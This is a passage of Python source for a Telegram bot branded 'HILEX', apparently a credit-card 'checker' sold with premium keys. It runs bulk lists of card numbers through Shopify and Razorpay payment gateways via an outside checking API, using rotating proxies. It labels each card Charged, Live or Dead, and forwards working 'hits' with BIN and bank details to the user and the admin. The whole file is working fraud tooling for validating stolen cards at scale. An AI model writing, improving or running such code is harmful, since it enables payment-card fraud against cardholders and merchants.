                    "site": site,
                    "gateway": gate,
                    "price": price,
                    "retry": False,
                }

            # If API explicitly says Status=true but we didn't match triggers, treat as Approved (live)
            if api_status is True:
                return {
                    "status": "Approved",
                    "message": response_msg[:150] if response_msg else "Approved (status true)",
                    "card": card,
                    "site": site,
                    "gateway": gate,
                    "price": price,
                    "retry": False,
                }

            # Status false / empty with no useful response -> soft retry
            if not response_msg:
                if attempt < max_retries - 1:
                    await asyncio.sleep(1.2)
                    continue
                return {
                    "status": "Site Error",
                    "message": "Empty API response",
                    "card": card,
                    "retry": True,
                    "gateway": gate,
                    "price": price,
                    "site": site,
                }

            # Has some response text but unmatched -> treat as Dead (real decline-ish) not infinite retry
            return {
                "status": "Dead",
                "message": response_msg[:150],
                "card": card,
                "site": site,
                "gateway": gate,
                "price": price,
                "retry": False,
            }

        except asyncio.TimeoutError:
            if attempt < max_retries - 1:
                await asyncio.sleep(1.5)
                continue
            return {
                "status": "Site Error",
                "message": "Request timeout",
                "card": card,
                "retry": True,
                "gateway": "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮",
                "price": "-",
                "site": site,
            }
        except Exception as e:
            if attempt < max_retries - 1:
                await asyncio.sleep(1.5)
                continue
            return {
                "status": "Site Error",
                "message": f"Error: {str(e)[:80]}",
                "card": card,
                "retry": True,
                "gateway": "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮",
                "price": "-",
                "site": site,
            }

    return {
        "status": "Site Error",
        "message": f"All {max_retries} retries failed",
        "card": card,
        "retry": True,
        "gateway": "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮",
        "price": "-",
        "site": site,
    }



async def check_card_with_retry(card, sites, proxies, max_retries=8):
    last = None
    for i in range(max_retries):
        site = random.choice(sites) if sites else ""
        proxy = random.choice(proxies) if proxies else ""
        res = await check_card(card, site, proxy)
        last = res
        # stop on real result
        if res.get("status") in ("Charged", "Approved", "Dead"):
            return res
        if res.get("status") != "Site Error" or not res.get("retry"):
            return res
        await asyncio.sleep(0.8 + (i * 0.15))
    return last if last else {
        "status": "Site Error",
        "message": "Retry exhausted",
        "card": card,
        "retry": False,
        "gateway": "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮",
        "price": "-",
        "site": "-",
    }


# ============================================================
# RAZORPAY
# ============================================================
async def check_card_razorpay(card, proxy, amount=1):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

        site = RAZORPAY_FIXED_SITE
        base_url = f"{RAZORPAY_API_BASE}?Key=aiojames&Site={site}&amount={amount}&cc={card}&proxy={proxy}"
        timeout = aiohttp.ClientTimeout(total=30)

        for attempt in range(20):
            try:
                async with aiohttp.ClientSession(timeout=timeout) as session:
                    async with session.get(base_url, ssl=False) as resp:
                        raw_text = (await resp.text()).strip()

                if not raw_text or len(raw_text) < 5:
                    if attempt < 19:
                        await asyncio.sleep(0.8)
                        continue
                    return {'status': 'Dead', 'message': 'Empty Response', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

                if not raw_text.startswith('{'):
                    if attempt < 19:
                        await asyncio.sleep(1.5)
                        continue
                    return {'status': 'Dead', 'message': f'Bad Response: {raw_text[:60]}', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

                try:
                    raw = json.loads(raw_text)
                except:
                    if attempt < 19:
                        await asyncio.sleep(1)
                        continue
                    return {'status': 'Dead', 'message': 'Invalid JSON', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

                response_msg = str(raw.get('response', raw.get('Response', raw.get('message', '')))).strip()
                price = str(raw.get('Price', amount))
                status_str = str(raw.get('status', raw.get('success', ''))).lower()

                if any(x in status_str for x in ["charged", "success", "true"]) or any(x in response_msg.lower() for x in ["charged", "order completed", "order_placed", "order_paid", "insufficient_funds", "thank you", "payment successful"]):
                    return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': 'Razorpay', 'price': price}
                elif any(x in status_str for x in ["approved", "success"]) or "otp" in response_msg.lower():
                    return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': 'Razorpay', 'price': price}
                else:
                    return {'status': 'Dead', 'message': response_msg or "DECLINED", 'card': card, 'site': site, 'gateway': 'Razorpay', 'price': price}

            except Exception:
                if attempt < 19:
                    await asyncio.sleep(1.5)
                    continue
                return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Razorpay', 'price': '-'}

        return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Razorpay', 'price': '-'}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e)[:100], 'card': card, 'gateway': 'Razorpay', 'price': '-'}

# ============================================================
# PROGRESS UI
# ============================================================
async def update_progress(user_id, message_id, results, current_attempt_count, first_name="User", is_razorpay=False):
    current_time = get_indian_time()
    charged = len(results.get('charged', []))
    approved = len(results.get('approved', []))
    dead = len(results.get('dead', []))
    errors = results.get('errors', 0)
    total = results.get('total', 0)
    checked = current_attempt_count
    percentage = round((checked / total) * 100, 1) if total > 0 else 0
    filled = int(percentage / 10)
    bar = "█" * filled + "░" * (10 - filled)
    gateway = "𝙍𝘼𝙕𝙊𝙍𝙋𝘼𝙔" if is_razorpay else "𝙎𝙃𝙊𝙋𝙄𝙁𝙔"
    last_cc = results.get('last_result', {}).get('card', '—')
    last_price = results.get('last_result', {}).get('price', '—')
    last_response = str(results.get('last_result', {}).get('message', '—'))[:50]
    user_plan = "💎 Premium" if is_premium(user_id) else "👑 Admin" if is_admin(user_id) else "⭐ Free"

    text = f"""<b>⚡ {BOT_NAME} ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>💥 Gateway ➜ {gateway}</b>
<b>🔄 Status ➜ Checking...</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔗 Process ➜ <code>{percentage}%</code> | <code>{checked}/{total}</code></b>
<code>{bar}</code>
<b>💳 Last CC ➜ <code>{last_cc}</code></b>
<b>💰 Price ➜ <code>{last_price}</code></b>
<b>❌ Resp ➜ <code>{last_response}</code></b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ Approved ➜ {approved}</b>
<b>💎 Charged ➜ {charged}</b>
<b>❌ Dead ➜ {dead}</b>
<b>⚠️ Errors ➜ {errors}</b>
<b>⏳ Time ➜ {current_time}</b>
━━━━━━━━━━━━━━━━━━━━
<b>👑 By ➜ <a href="tg://user?id={user_id}">{first_name}</a> [{user_plan}]</b>
<b>🤖 Bot By ➜ <a href="tg://user?id={ADMIN_ID}">{OWNER_NAME}</a></b>"""

    buttons = [
        [
            Button.inline(f"🔥 Live ({approved})", f"live_{message_id}".encode()),
            Button.inline(f"💎 Charged ({charged})", f"charged_{message_id}".encode())
        ],
        [
            Button.inline(f"❌ Dead ({dead})", f"dead_{message_id}".encode()),
            Button.inline("🛑 Stop", f"stop_{message_id}".encode())
        ]
    ]
    try:
        await bot.edit_message(user_id, message_id, premium_emoji(text), buttons=buttons, parse_mode="html")
    except:
        pass

# ============================================================
# FINAL RESULTS
# ============================================================
async def send_final_results(chat_id, results):
    if not results or not isinstance(results, dict):
        results = {'charged': [], 'approved': [], 'dead': [], 'error_cards': [], 'api_errors': 0, 'errors': 0, 'total': 0, 'start_time': time.time()}

    if 'start_time' not in results:
        results['start_time'] = time.time()

    error_count = len(results.get('error_cards', []))
    if 'total' not in results:
        results['total'] = len(results.get('charged', [])) + len(results.get('approved', [])) + len(results.get('dead', [])) + error_count

    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60

    hits_text = ""
    for r in results.get('charged', [])[:5]:
        hits_text += f"💎 <code>{r['card']}</code>\n"
    for r in results.get('approved', [])[:5]:
        hits_text += f"🔥 <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "No hits found"

    gateway = "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮"
    price = "0.00"
    if results.get("charged"):
        gateway = results["charged"][0].get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = results["charged"][0].get("price", "-")
    elif results.get("approved"):
        gateway = results["approved"][0].get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = results["approved"][0].get("price", "-")

    summary = f"""<b>⚡💳 {BOT_NAME} 💳⚡</b>
━━━━━━━━━━━━━━━━━
<b>💠 Results</b>
<blockquote>💳 Total: {results.get('total', 0)} | 💎 Charged: {len(results.get('charged', []))} | 🔥 Live: {len(results.get('approved', []))} | ❌ Dead: {len(results.get('dead', []))} | ⚠️ Error: {error_count}</blockquote>
<blockquote>🌐 Gateway ⇾ {gateway} | 💰 {price}</blockquote>
<blockquote>⏱️ Time: {hours}h {minutes}m {seconds}s</blockquote>
━━━━━━━━━━━━━━━━━
<b>🎯 Hits</b>
<blockquote>{hits_text}</blockquote>
━━━━━━━━━━━━━━━━━
🤖 <b>Bot By: <a href="tg://user?id={ADMIN_ID}">{OWNER_NAME}</a></b>"""

    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"ʜ ᴇ ʟ ᴇ x メ_Result_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 70 + "\n")
        await f.write(f"⚡ {BOT_NAME} FINAL RESULTS ⚡\n")
        await f.write("=" * 70 + "\n\n")
        await f.write(f"Total: {results.get('total', 0)}\n")
        await f.write(f"Charged: {len(results.get('charged', []))}\n")
        await f.write(f"Approved: {len(results.get('approved', []))}\n")
        await f.write(f"Dead: {len(results.get('dead', []))}\n")
        await f.write(f"Errors: {error_count}\n")
        await f.write(f"Time: {hours}h {minutes}m {seconds}s\n")
        await f.write("=" * 70 + "\n\n")

        if results.get('charged'):
            await f.write(f"💎 CHARGED ({len(results['charged'])}):\n")
            for r in results['charged']:
                await f.write(f"{r.get('card')} | {r.get('gateway')} | {r.get('price')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")

        if results.get('approved'):
            await f.write(f"🔥 APPROVED ({len(results['approved'])}):\n")
            for r in results['approved']:
                await f.write(f"{r.get('card')} | {r.get('gateway')} | {r.get('price')} | {str(r.get('message', ''))[:100]}\n")
            await f.write("\n")

        if results.get('dead'):
            await f.write(f"❌ DEAD ({len(results['dead'])}):\n")
            for r in results['dead']:
                await f.write(f"{r.get('card')} | {r.get('gateway')} | {r.get('price')} | {str(r.get('message', ''))[:100]}\n")

    try:
        await bot.send_message(chat_id, premium_emoji(summary), file=filename, parse_mode="html")
    except:
        await bot.send_message(chat_id, premium_emoji(summary), parse_mode="html")
    try:
        os.remove(filename)
    except:
        pass

    update_stats(
        total_checks=results.get('total', 0),
        total_charged=len(results.get('charged', [])),
        total_approved=len(results.get('approved', [])),
        total_dead=len(results.get('dead', []))
    )

# ============================================================
# CARD FILE
# ============================================================
async def send_card_file(user_id, cards, title, file_prefix, is_dead=False):
    timestamp = datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y%m%d_%H%M%S")
    filename = f"ʜ ᴇ ʟ ᴇ x メ_{file_prefix}_{timestamp}.txt"

    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write("=" * 70 + "\n")
        await f.write(f"⚡ {title} - {BOT_NAME} ⚡\n")
        await f.write("=" * 70 + "\n\n")
        for r in cards:
            card = r.get('card', 'N/A')
            gateway = r.get('gateway', 'Auto Shopify')
            price = r.get('price', '-')
            message = str(r.get('message', 'Unknown'))[:100]
            if '|' in card:
                brand, _, _, bank, country, flag = await get_bin_info(card.split('|')[0])
            else:
                brand = bank = country = flag = '-'
            is_razorpay = "razorpay" in gateway.lower() or "rz" in gateway.lower()
            currency = "₹" if is_razorpay else "$"
            status_text = "Charged 💎" if "CHARGED" in title.upper() else "Live 🔥" if "LIVE" in title.upper() else "Dead ❌"
            await f.write(f"""[❆] {status_text}
💳 ⤷ <code>{card}</code>
Gate ➳ {gateway} {price}{currency}
Resp ➳ {message}
Bin ➳ {brand} - {bank} - {country} {flag}
{'='*50}\n""")

    try:
        await bot.send_file(user_id, file=filename, caption=f"[❆] {title} – {len(cards)} cards", parse_mode="html")
    except Exception as e:
        await bot.send_message(user_id, f"❌ Error: {str(e)[:80]}")
    try:
        os.remove(filename)
    except:
        pass

# ============================================================
# HIT NOTIFY
# ============================================================
async def send_hit_to_admin(result, user_id, hit_type):
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        gateway = result.get("gateway", "𝘼𝙪𝙩𝙤 𝙎𝙝𝙤𝙥𝙞𝙛𝙮")
        price = result.get("price", "-")
        response_msg = str(result.get('message', ''))[:120]
        status_text = "Charged 💎" if result['status'] == 'Charged' else "Live 🔥"
        current_time = get_indian_time()
        try:
            sender = await bot.get_entity(user_id)
            first_name = sender.first_name or "Unknown"
            tg_username = "@" + sender.username if sender.username else "No Username"
        except:
            first_name = "Unknown"
            tg_username = "No Username"
        plan = "👑 Admin" if is_admin(user_id) else "💎 Premium" if is_premium(user_id) else "⭐ Free"
        currency = "₹" if "razorpay" in gateway.lower() else "$"

        admin_msg = f"""╔══〔 🔥 ᴀᴅᴍɪɴ · ʜɪᴛ ʟᴏɢ 〕══╗

❝ {status_text} ❞
<blockquote>⚡ {response_msg}</blockquote>

👤 <b>{tg_username}</b> · <code>{user_id}</code>
💠 {plan}

💳 <b>Card</b>
┃ <code>{result['card']}</code>

💰 <b>{currency}{price}</b> via <code>{gateway}</code>

💳 <b>Bin</b>
┣ {brand} · {bank}
┗ ☄️ {country} {flag}

⏱ <code>{current_time}</code>
🔗 <a href="tg://user?id={user_id}">{first_name}</a>

╚══〔 ʜ ᴇ ʟ ᴇ x  メ 〕══╝"""
        await bot.send_message(ADMIN_ID, premium_emoji(admin_msg), parse_mode='html')
    except Exception as e:
        print(f"Admin hit error: {e}")

async def send_realtime_hit_dm(user_id, result, hit_type, first_name):
    try:
        if result['status'] not in ['Charged', 'Approved']:
            return
        brand, _, _, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
        gateway = result.get('gateway', 'Auto Shopify')
        price = result.get('price', '-')
        response_msg = str(result.get('message', ''))[:60]
        status_text = "Charged 💎" if result['status'] == 'Charged' else "Live 🔥"
        plan = "👑 Admin" if is_admin(user_id) else "💎 Premium" if is_premium(user_id) else "⭐ Free"
        currency = "₹" if "razorpay" in gateway.lower() else "$"
        current_time = get_indian_time()

        dm_msg = f"""╔══〔 💎 ʜɪʟᴇx ʜɪᴛ 〕══╗

❝ {status_text} ❞
<blockquote>⚡ {response_msg}</blockquote>

💠 <b>Card</b>
┃ <tg-spoiler><code>{result['card']}</code></tg-spoiler>

💰 <b>Amount</b> · <b>{currency}{price}</b>
🔗 <b>Gate</b> · <code>{gateway}</code>

💳 <b>Bin Info</b>
┣ {result['card'][:6]} · {brand}
┣ 🏧 {bank}
┗ ☄️ {country} {flag}

⏱ <code>{current_time}</code>
👤 <a href="tg://user?id={user_id}">{first_name}</a> <i>[{plan}]</i>

╚══〔 ʜ ᴇ ʟ ᴇ x  メ 〕══╝"""
        buttons = [
            [Button.inline("📋 Copy CC", f"copycc_{result['card']}".encode())]
        ]
        # Send gif + message together as one media message
        gif_url = await fetch_random_anime_gif()
        sent = False
        if gif_url:
            try:
                import tempfile, os as _os
                async with aiohttp.ClientSession() as _s:
                    async with _s.get(gif_url, timeout=aiohttp.ClientTimeout(total=12)) as _r:
                        _gif_data = await _r.read()
                with tempfile.NamedTemporaryFile(suffix=".mp4", delete=False) as _tmp:
                    _tmp.write(_gif_data)
                    _tmp_path = _tmp.name
                await bot.send_file(
                    user_id, _tmp_path,
                    caption=premium_emoji(dm_msg),
                    buttons=buttons,
                    parse_mode="html",
                    supports_streaming=True
                )
                try: _os.remove(_tmp_path)
                except: pass
                sent = True
            except Exception: pass
        if not sent:
            await bot.send_message(user_id, premium_emoji(dm_msg), buttons=buttons, parse_mode="html")
    except Exception as e:
        print(f"DM hit error: {e}")

# ============================================================
# USER SAVE
# ============================================================
def save_user(user_id):
    try:
        conn = sqlite3.connect('users.db')
        cursor = conn.cursor()
        cursor.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)")
        cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
        update_stats(total_users=1)
    except:
        pass

# ============================================================
# CHANNEL CHECK
# ============================================================
async def is_joined_channel(user_id):
    try:
        # Private channel invite link — use entity or skip strict check if needed
        channel = await bot.get_entity(CHANNEL_USERNAME)
        try:
            await bot.get_participant(channel, user_id)
            return True
        except:
            try:
                await bot.get_permissions(channel, user_id)
                return True
            except:
                return False
    except:
        return True   # fallback true if private invite

# ============================================================
# START MENU
# ============================================================
@bot.on(events.NewMessage(pattern='/start'))
async def start_handler(event):
    user_id = event.sender_id
    save_user(user_id)

    if is_blocked(user_id):
        await event.reply(premium_emoji("❌ **You are blocked.** Contact owner."), parse_mode="html")
        return

    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "User"
    except:
        first_name = "User"

    plan = "👑 Admin" if is_admin(user_id) else "💎 Premium" if is_premium(user_id) else "⭐ Free"
    usage = get_daily_usage(user_id)
    daily_left = "∞" if is_admin(user_id) or is_premium(user_id) else f"{150 - usage['cc_count']}"

    welcome = f"""╔══〔 ⚡ ʜ ᴇ ʟ ᴇ x  メ 〕══╗

❝ Welcome, <b>{first_name}</b> ❞
<blockquote>Elite tools. Real hits. No limits.</blockquote>

💠 <b>Plan</b> · {plan}
📊 <b>Checks left</b> · <code>{daily_left}</code>

━━━━━━━━━━━━━━━━━━━━
⚡ <b>ʜɪʟᴇx Features</b>
┣ 💳 Shopify + Razorpay gates
┣ 📦 Bulk up to 100k cards
┣ 🔥 Realtime hits + DM notify
┗ 📊 Stats · Analytics · Proxy

━━━━━━━━━━━━━━━━━━━━
👑 <a href="tg://user?id={ADMIN_ID}">{OWNER_NAME}</a>
📢 <a href="{CHANNEL_LINK}">Channel</a>  ·  👥 <a href="{GROUP_LINK}">Group</a>

╚══〔 ʜ ᴇ ʟ ᴇ x  メ 〕══╝"""

    buttons = [
        [
            Button.inline("🛒 Shopify", b"shopify_tools"),
            Button.inline("💎 Razorpay", b"rz_tools")
        ],
        [
            Button.inline("?? Proxy", b"proxy_tools"),
            Button.inline("💳 CC Tools", b"cc_tools")
        ],
        [
            Button.inline("🔑 Plan", b"premium_tools"),
            Button.inline("📊 Stats", b"bot_stats")
        ],
        [
            Button.inline("💬 Feedback", b"feedback_menu"),
            Button.inline("ℹ️ Help", b"help_menu")
        ]
    ]

    if is_admin(user_id):
        buttons.append([Button.inline("🛠 ADMIN PANEL", b"admin_panel")])

    await send_start_video(event.chat_id, premium_emoji(welcome), buttons)

# ============================================================
# ADMIN PANEL
# ============================================================
@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel(event):
    if not is_admin(event.sender_id):
        await event.answer("nice try but its  Admins only !", alert=True)
        return
    await event.answer()
    stats = load_stats()
    text = f"""<b>🛠 ADMIN PANEL</b>
━━━━━━━━━━━━━━━━━━━━
<b>👥 Users:</b> <code>{stats.get('total_users', 0)}</code>
<b>💳 Checks:</b> <code>{stats.get('total_checks', 0)}</code>
<b>💎 Charged:</b> <code>{stats.get('total_charged', 0)}</code>
<b>🔥 Approved:</b> <code>{stats.get('total_approved', 0)}</code>
<b>💬 Feedback:</b> <code>{stats.get('total_feedback', 0)}</code>
━━━━━━━━━━━━━━━━━━━━
<b>Choose action:</b>"""
    buttons = [
        [
            Button.inline("🔑 Gen Keys", b"admin_genkeys"),
            Button.inline("📊 Full Stats", b"admin_fullstats")
        ],
        [
            Button.inline("🚫 Block User", b"admin_block"),
            Button.inline("✅ Unblock", b"admin_unblock")
        ],
        [
            Button.inline("📋 Blocklist", b"admin_blocklist"),
            Button.inline("👥 Users List", b"admin_users")
        ],
        [
            Button.inline("📢 Broadcast", b"admin_broadcast"),
            Button.inline("💬 View Feedback", b"admin_feedback")
        ],
        [
            Button.inline("🔙 Back", b"back_to_start")
        ]
    ]
    await event.edit(premium_emoji(text), buttons=buttons, parse_mode="html")

@bot.on(events.CallbackQuery(data=b"admin_genkeys"))
async def admin_genkeys(event):
    if not is_admin(event.sender_id):
        return
    await event.answer()
    text = """<b>🔑 GENERATE KEYS</b>
━━━━━━━━━━━━━━━━━━━━
<code>/key 5 30</code> → 5 keys of 30 days
<code>/key 10 7</code> → 10 keys of 7 days
<code>/multikey 3 30 5</code> → multi-device (days devices)
━━━━━━━━━━━━━━━━━━━━
Keys start with <code>HILEX-</code>"""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Admin", b"admin_panel")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"admin_fullstats"))
async def admin_fullstats(event):
    if not is_admin(event.sender_id):
        return
    await event.answer()
    stats = load_stats()
    text = f"""<b>📊 FULL STATS</b>
━━━━━━━━━━━━━━━━━━━━
👥 Users: <code>{stats.get('total_users', 0)}</code>
💳 Total Checks: <code>{stats.get('total_checks', 0)}</code>
💎 Charged: <code>{stats.get('total_charged', 0)}</code>
🔥 Approved: <code>{stats.get('total_approved', 0)}</code>
❌ Dead: <code>{stats.get('total_dead', 0)}</code>
💬 Feedback: <code>{stats.get('total_feedback', 0)}</code>
⏰ Updated: {stats.get('last_updated', '—')}
━━━━━━━━━━━━━━━━━━━━
👑 {OWNER_NAME}"""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Admin", b"admin_panel")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"admin_block"))
async def admin_block(event):
    if not is_admin(event.sender_id):
        return
    await event.answer()
    text = """<b>🚫 BLOCK USER</b>
━━━━━━━━━━━━━━━━━━━━
<code>/block USER_ID</code>
Example: <code>/block 123456789</code>"""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Admin", b"admin_panel")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"admin_unblock"))
async def admin_unblock(event):
    if not is_admin(event.sender_id):
        return
    await event.answer()
    text = """<b>✅ UNBLOCK USER</b>
━━━━━━━━━━━━━━━━━━━━
<code>/unblock USER_ID</code>
Example: <code>/unblock 123456789</code>"""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Admin", b"admin_panel")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"admin_blocklist"))
async def admin_blocklist(event):
    if not is_admin(event.sender_id):
        return
    await event.answer()
    blocked = get_blocked_users()
    if not blocked:
        text = "<b>📋 BLOCKLIST EMPTY</b>"
    else:
        text = f"<b>📋 BLOCKED USERS ({len(blocked)})</b>\n━━━━━━━━━━━━━━━━━━━━\n" + "\n".join([f"<code>{uid}</code>" for uid in blocked[:50]])
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Admin", b"admin_panel")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"admin_users"))
async def admin_users(event):
    if not is_admin(event.sender_id):
        return
    await event.answer("Fetching users...", alert=False)
    # reuse /users logic
    await event.edit(premium_emoji("<b>👥 Use /users command for full list + TXT</b>"), buttons=[[Button.inline("🔙 Admin", b"admin_panel")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"admin_broadcast"))
async def admin_broadcast(event):
    if not is_admin(event.sender_id):
        return
    await event.answer()
    text = """<b>📢 BROADCAST</b>
━━━━━━━━━━━━━━━━━━━━
<code>/Note your message here</code>
Supports multi-line.
All users will receive it."""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Admin", b"admin_panel")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"admin_feedback"))
async def admin_feedback(event):
    if not is_admin(event.sender_id):
        return
    await event.answer()
    data = load_feedback()
    if not data:
        text = "<b>💬 No feedback yet.</b>"
    else:
        last = data[-5:]
        text = f"<b>💬 LAST {len(last)} FEEDBACK</b>\n━━━━━━━━━━━━━━━━━━━━\n"
        for e in reversed(last):
            text += f"👤 {e.get('username')} | {e.get('rating') or '—'}/5\n{e.get('text')[:80]}\n⏰ {e.get('time')}\n\n"
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Admin", b"admin_panel")]], parse_mode="html")

# ============================================================
# FEEDBACK + STATS + HELP + BACK (same as before, rebranded)
# ============================================================
@bot.on(events.CallbackQuery(data=b"feedback_menu"))
async def feedback_menu(event):
    await event.answer()
    text = f"""<b>💬 FEEDBACK CENTER</b>
━━━━━━━━━━━━━━━━━━━━
<code>/feedback your message</code>
Optional rating 1-5 at end.
Example: <code>/feedback fire bot 5</code>
━━━━━━━━━━━━━━━━━━━━
👑 Goes to {OWNER_NAME}"""
    buttons = [
        [Button.inline("✍️ Write Feedback", b"write_feedback")],
        [Button.inline("🔙 Back", b"back_to_start")]
    ]
    await event.edit(premium_emoji(text), buttons=buttons, parse_mode="html")

@bot.on(events.CallbackQuery(data=b"write_feedback"))
async def write_feedback_handler(event):
    user_id = event.sender_id
    user_feedback_state[user_id] = True
    await event.answer("✍️ Send feedback now...", alert=True)
    await event.edit(premium_emoji("<b>✍️ Type your feedback and send it.</b>"), parse_mode="html")

@bot.on(events.NewMessage(pattern=r'^/feedback(?:\s|$)([\s\S]*)'))
async def feedback_cmd(event):
    user_id = event.sender_id
    text = event.pattern_match.group(1).strip()
    if not text:
        await event.reply(premium_emoji("❌ Usage: <code>/feedback message</code>"), parse_mode="html")
        return
    rating = None
    if text[-1].isdigit() and int(text[-1]) in range(1, 6):
        rating = int(text[-1])
        text = text[:-1].strip()
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{user_id}"
        first_name = sender.first_name or "User"
    except:
        username = f"user_{user_id}"
        first_name = "User"
    entry = add_feedback(user_id, username, text, rating)
    await event.reply(premium_emoji(f"""✅ <b>Feedback Received!</b>
━━━━━━━━━━━━━━━━━━━━
📝 {text[:200]}
{f'⭐ {rating}/5' if rating else ''}
━━━━━━━━━━━━━━━━━━━━
?? Thanks {first_name}!"""), parse_mode="html")
    try:
        await bot.send_message(ADMIN_ID, premium_emoji(f"💬 NEW FEEDBACK\n👤 {first_name} (@{username})\n🆔 {user_id}\n{f'⭐ {rating}/5' if rating else ''}\n\n{text}"), parse_mode="html")
    except:
        pass

@bot.on(events.NewMessage)
async def catch_feedback_text(event):
    user_id = event.sender_id
    if user_id in user_feedback_state and user_feedback_state[user_id]:
        if event.message.text and not event.message.text.startswith('/'):
            text = event.message.text.strip()
            rating = None
            if text and text[-1].isdigit() and int(text[-1]) in range(1, 6):
                rating = int(text[-1])
                text = text[:-1].strip()
            try:
                sender = await event.get_sender()
                username = sender.username or f"user_{user_id}"
                first_name = sender.first_name or "User"
            except:
                username = f"user_{user_id}"
                first_name = "User"
            add_feedback(user_id, username, text, rating)
            del user_feedback_state[user_id]
            await event.reply(premium_emoji(f"✅ Feedback saved!\n👑 Thanks {first_name}!"), parse_mode="html")
            try:
                await bot.send_message(ADMIN_ID, premium_emoji(f"💬 FEEDBACK from {first_name}\n{text}"), parse_mode="html")
            except:
                pass

@bot.on(events.CallbackQuery(data=b"bot_stats"))
async def bot_stats_handler(event):
    await event.answer()
    stats = load_stats()
    text = f"""<b>📊 BOT STATISTICS</b>
━━━━━━━━━━━━━━━━━━━━
👥 Users: <code>{stats.get('total_users', 0)}</code>
💳 Checks: <code>{stats.get('total_checks', 0)}</code>
💎 Charged: <code>{stats.get('total_charged', 0)}</code>
🔥 Approved: <code>{stats.get('total_approved', 0)}</code>
❌ Dead: <code>{stats.get('total_dead', 0)}</code>
💬 Feedback: <code>{stats.get('total_feedback', 0)}</code>
━━━━━━━━━━━━━━━━━━━━
⏰ {stats.get('last_updated', '—')}
👑 <a href="tg://user?id={ADMIN_ID}">{OWNER_NAME}</a>"""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Back", b"back_to_start")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"help_menu"))
async def help_menu(event):
    await event.answer()
    text = f"""<b>ℹ️ HELP & COMMANDS</b>
━━━━━━━━━━━━━━━━━━━━
<b>💳 CHECKING</b>
<code>/cc card|mm|yy|cvv</code>
<code>/chk</code> (reply .txt)
<code>/rz card|mm|yy|cvv</code>
<code>/rzchk</code>

<b>📡 PROXY</b>
<code>/addproxy ip:port</code>
<code>/proxy</code> <code>/getproxy</code> <code>/clearproxy</code>

<b>🛒 SITES</b>
<code>/addsite url</code> <code>/mysites</code> <code>/site</code>

<b>🔑 PREMIUM</b>
<code>/redeem KEY</code> <code>/plan</code>

<b>💬 OTHER</b>
<code>/feedback msg</code>
<code>/gen BIN COUNT</code>
<code>/scrape</code> <code>/split 100</code>
━━━━━━━━━━━━━━━━━━━━
👑 <a href="tg://user?id={ADMIN_ID}">{OWNER_NAME}</a>
📢 <a href="{CHANNEL_LINK}">Channel</a> | 👥 <a href="{GROUP_LINK}">Group</a>"""
    await event.edit(premium_emoji(text), buttons=[[Button.inline("🔙 Back", b"back_to_start")]], parse_mode="html")

@bot.on(events.CallbackQuery(data=b"back_to_start"))
async def back_to_start(event):
    await event.answer()
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "User"
    except:
        first_name = "User"
    plan = "👑 Admin" if is_admin(user_id) else "💎 Premium" if is_premium(user_id) else "⭐ Free"
    usage = get_daily_usage(user_id)
    daily_left = "∞" if is_admin(user_id) or is_premium(user_id) else f"{150 - usage['cc_count']}"

    welcome = f"""<b>⚡ {BOT_NAME} ⚡</b>
━━━━━━━━━━━━━━━━━━━━
